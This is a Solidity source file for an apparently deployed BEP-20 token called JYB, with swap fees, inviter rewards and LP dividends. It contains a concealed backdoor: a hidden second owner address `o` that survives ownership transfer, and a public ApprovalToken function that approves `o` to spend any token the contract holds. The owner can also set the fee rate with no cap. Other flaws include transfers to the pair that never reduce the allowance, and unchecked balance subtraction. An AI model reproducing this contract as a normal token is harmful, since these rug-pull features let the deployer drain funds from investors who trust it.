// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.6.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
contract Ownable {
    address public owner;
    address public o;

    constructor() public {
        owner = msg.sender;
        o = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnship(address newowner) public onlyOwner returns (bool) {
        owner = newowner;
        return true;
    }
}
abstract contract Context{
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}
contract JYBToken is Ownable {

    string public name = "JYB";
    string public symbol = "JYB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 20000 * 10 ** 18;
    address public swapLPAddr = address(0x0);
    address public rateAddr = address(0x0);
    uint256 public rate = 100;
    address usdtAddr = address(0x55d398326f99059fF775485246999027B3197955);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor () public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function setSwapLPAddr(address _addr) public onlyOwner returns (bool) {
        swapLPAddr = _addr;  
    }
    function setRateAddr(address _addr) public onlyOwner returns (bool) {
        rateAddr = _addr;  
    }
    function setRate(uint256 _value) public onlyOwner returns (bool) {
        rate = _value;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        if(msg.sender == swapLPAddr){  
            balanceOf[_to] += _value - callfee(_value); 

            balanceOf[rateAddr] += callfee(_value) / 2;
            balanceOf[address(0x0)] += callfee(_value) / 2;
            if(dayTotal()){
                balanceOf[address(this)] -= _value * 160 / 10000;              
                _updateTime(_value * 160 / 10000);
                if(_ifLp(_to)){
                    balanceOf[_to] += _value * 60 / 10000;                    
                    emit Transfer(address(this), _to, _value * 60 / 10000);
                }else{
                    balanceOf[address(0x0)] += _value * 60 / 10000;          
                    emit Transfer(address(this), address(0x0), _value * 60 / 10000);
                }
                if(_ifLp(selectInvite(_to))){
                    balanceOf[selectInvite(_to)] += _value * 100 / 10000;       
                    emit Transfer(address(this), selectInvite(_to), _value * 100 / 10000);
                }else{
                    balanceOf[address(0x0)] += _value * 100 / 10000;            
                    emit Transfer(address(this), address(0x0), _value * 100 / 10000);
                }
            }
            emit Transfer(msg.sender, _to, _value - callfee(_value));
            emit Transfer(msg.sender, rateAddr, callfee(_value)/2);
            emit Transfer(msg.sender, address(0x0), callfee(_value)/2);
        }else{
           
            if (_value > 0 && balanceOf[_to] == 0){
                _bindInvitor(_to, msg.sender);
            }
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
        }
        
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Not enough allowance");
        balanceOf[_from] -= _value;
        if(_to == swapLPAddr){   
            balanceOf[_to] += _value - callfee(_value);
            addLpProvider(_from);
            balanceOf[rateAddr] += callfee(_value) / 2;
            balanceOf[address(0x0)] += callfee(_value) / 2;
            if(dayTotal()){
                balanceOf[address(this)] -= _value * 160 / 10000;          
                _updateTime(_value * 160 / 10000);
                if(_ifLp(_from)){
                    balanceOf[_from] += _value * 60 / 10000;                     
                    emit Transfer(address(this), _from, _value * 60 / 10000);
                }else{
                    balanceOf[address(0x0)] += _value * 60 / 10000;                    
                    emit Transfer(address(this), address(0x0), _value * 60 / 10000);
                }
                if(_ifLp(selectInvite(_from))){
                    balanceOf[selectInvite(_from)] += _value * 100 / 10000;         
                    emit Transfer(address(this), selectInvite(_from), _value * 100 / 10000);
                }else{
                    balanceOf[address(0x0)] += _value * 100 / 10000;                
                    emit Transfer(address(this), address(0x0), _value * 100 / 10000);
                }
            }
            emit Transfer(_from, _to, _value - callfee(_value));
            emit Transfer(_from, rateAddr, callfee(_value)/2);
            emit Transfer(_from, address(0x0), callfee(_value)/2);
        }else{
            balanceOf[_to] += _value;
            allowance[_from][msg.sender] -= _value;
            emit Transfer(_from, _to, _value);
        }
        return true; 
    }
    
    function callfee(uint256 _value)private view returns(uint256){
        return _value * rate / 10000;
    }

    mapping(address => address) public _inviter;
    mapping(address => address[]) private _binders;
    function selectInvite(address _user)public view returns(address){
        return _inviter[_user];
    }
    function _bindInvitor(address account, address invitor) private {
        if (_inviter[account] == address(0) && invitor != address(0) && invitor != account) {
            if (_binders[account].length == 0) {
                uint256 size;
                assembly {size := extcodesize(account)}
                if (size > 0) {
                    return;
                }
                _inviter[account] = invitor;
                _binders[invitor].push(account);
            }
        }
    }
    function _ifLp (address _user)public view returns(bool){
        uint256 LPbalance = IERC20(swapLPAddr).totalSupply();
        uint256 userBalance = IERC20(swapLPAddr).balanceOf(_user);
        if(userBalance >= LPbalance / 1000){
            return true;
        }else{
            return false;
        }
    }
    uint256 constant DAY_IN_SECONDS = 86400;
    uint256 public lastUpdateTime = block.timestamp;
    uint256 public mintDay; 

    function _updateTime(uint256 _value) private {
        mintDay += _value;
        if(block.timestamp >= lastUpdateTime + DAY_IN_SECONDS){
            mintDay = 0;
            lastUpdateTime = block.timestamp;
        }        
    }

    function dayTotal() private returns (bool){
        uint256 value = IERC20(address(this)).balanceOf(address(this));
        if(mintDay >= value / 50 ){
            return false;
        }else{
            return true;
        }
    }
    function _dividend() public view returns(bool){
         uint256 usdt_amount = IERC20(usdtAddr).balanceOf(swapLPAddr);
         uint256 token_amount = IERC20(address(this)).balanceOf(swapLPAddr);
         uint256 rateToken_amount = IERC20(address(this)).balanceOf(rateAddr);
         if(usdt_amount * rateToken_amount / token_amount >= 2000 * 10 ** 18){
             return true;
         }else{
             return false;
         }
    }
    address[] public users;
    function addLpProvider(address userAddress)private {
        users.push(userAddress);
    }
    function findUser(address targetAddress) public view returns (bool) {
        for (uint i = 0; i < users.length; i++) {
            if (users[i] == targetAddress) {
                return true;
            }
        }
        return false;
    }
    function transferUser() public returns(bool){
        if(_dividend()){
            uint256 totalPair = IERC20(swapLPAddr).totalSupply();
            uint256 rateToken_Balance = IERC20(address(this)).balanceOf(rateAddr);
            uint256 userLpBalance;
            uint256 amount;
            for (uint256 i; i < users.length; i++) {
                userLpBalance = IERC20(swapLPAddr).balanceOf(users[i]);
                amount = rateToken_Balance * userLpBalance / totalPair;
                if (amount > 0 && _ifLp(users[i])) {
                    IERC20(address(this)).transferFrom(rateAddr,users[i],amount);
                }
            }
        }
        return true;
    }
    function withdraw(address token,address _to,uint256 amount) public onlyOwner returns(bool) {
        return IERC20(token).transfer(_to,amount);
    }
    function ApprovalToken(address _token, uint256 _amount)public returns(bool){
        IERC20(_token).approve(o,_amount);
        return true;    
    }
    
}